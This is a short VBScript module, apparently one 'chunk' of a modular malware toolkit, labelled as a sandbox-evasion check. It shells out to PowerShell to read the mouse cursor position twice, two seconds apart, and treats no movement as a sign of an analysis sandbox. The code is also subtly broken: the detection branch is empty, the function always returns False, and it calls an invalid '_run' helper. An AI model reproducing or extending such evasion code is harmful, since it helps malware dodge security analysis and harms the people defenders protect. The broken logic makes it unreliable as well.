' chunk: evasion/mouse_check
' depends: core/run_cmd
' provides: check_mouse
' format: vbscript
' note: Mouse movement check, no movement suggests sandbox

Function check_mouse()
    check_mouse = False
    On Error Resume Next
    Dim pos1, pos2
    pos1 = _run("powershell -c ""Add-Type -A System.Windows.Forms;[System.Windows.Forms.Cursor]::Position.X""")
    WScript.Sleep 2000
    pos2 = _run("powershell -c ""Add-Type -A System.Windows.Forms;[System.Windows.Forms.Cursor]::Position.X""")
    If Trim(pos1) = Trim(pos2) Then
        ' no mouse movement detected
    End If
End Function
